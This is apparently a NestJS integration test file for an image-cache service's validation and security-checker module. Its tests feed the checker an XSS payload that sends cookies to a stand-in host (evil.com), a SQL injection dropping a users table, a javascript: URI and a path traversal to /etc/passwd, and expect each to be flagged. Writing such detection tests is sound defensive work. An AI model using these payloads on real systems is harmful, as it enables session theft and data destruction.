import CacheImageRequest, { ResizeOptions, SupportedResizeFormats } from '@microservice/API/DTO/CacheImageRequest'
import { ConfigModule } from '@microservice/Config/config.module'
import { CorrelationModule } from '@microservice/Correlation/correlation.module'
import { InputSanitizationService } from '@microservice/Validation/services/input-sanitization.service'
import { SecurityCheckerService } from '@microservice/Validation/services/security-checker.service'
import { SimpleValidationService } from '@microservice/Validation/services/simple-validation.service'
import { ValidationModule } from '@microservice/Validation/validation.module'
import { Test, TestingModule } from '@nestjs/testing'

describe('validation Integration', () => {
	let module: TestingModule
	let validationService: SimpleValidationService
	let sanitizationService: InputSanitizationService
	let securityChecker: SecurityCheckerService

	beforeEach(async () => {
		module = await Test.createTestingModule({
			imports: [
				ConfigModule,
				CorrelationModule,
				ValidationModule,
			],
		}).compile()

		validationService = module.get<SimpleValidationService>(SimpleValidationService)
		sanitizationService = module.get<InputSanitizationService>(InputSanitizationService)
		securityChecker = module.get<SecurityCheckerService>(SecurityCheckerService)
	})

	afterEach(async () => {
		await module.close()
	})

	it('should be defined', () => {
		expect(validationService).toBeDefined()
		expect(sanitizationService).toBeDefined()
		expect(securityChecker).toBeDefined()
	})

	describe('end-to-End Validation Flow', () => {
		it('should validate a complete valid request', async () => {
			const request = new CacheImageRequest({
				resourceTarget: 'https://localhost:3000/test-image.jpg',
				ttl: 3600,
				resizeOptions: new ResizeOptions({
					width: 800,
					height: 600,
					format: SupportedResizeFormats.webp,
					quality: 85,
				}),
			})

			const result = await validationService.validateCacheImageRequest(request)
			expect(result.isValid).toBe(true)
		})

		it('should sanitize and validate input', async () => {
			const input = {
				name: 'John Doe',
				url: 'https://localhost:3000/image.jpg',
				dimensions: { width: 800, height: 600 },
			}

			const result = await validationService.validateInput(input)

			expect(result.isValid).toBe(true)
			expect(result.sanitizedInput.name).toBe('John Doe')
		})

		it('should detect and log security events', async () => {
			const maliciousInput = {
				payload: '<script>document.location="http://evil.com/steal?cookie="+document.cookie</script>',
			}

			const result = await validationService.validateInput(maliciousInput)

			expect(result.isValid).toBe(false)
			expect(result.errors).toContain('Input contains potentially malicious content')
		})
	})

	describe('security Features', () => {
		it('should detect various attack patterns', async () => {
			const attackPatterns = [
				'<script>alert("xss")</script>',
				'javascript:alert(1)',
				'\'; DROP TABLE users; --',
				'../../../etc/passwd',
			]

			for (const pattern of attackPatterns) {
				const isMalicious = await securityChecker.checkForMaliciousContent(pattern)
				expect(isMalicious).toBe(true)
			}
		})

		it('should maintain security event history', async () => {
			await securityChecker.logSecurityEvent({
				type: 'malicious_content',
				source: 'test',
				details: { pattern: 'xss' },
			})

			const stats = securityChecker.getSecurityStats()
			expect(stats.totalEvents).toBeGreaterThan(0)
		})
	})
})
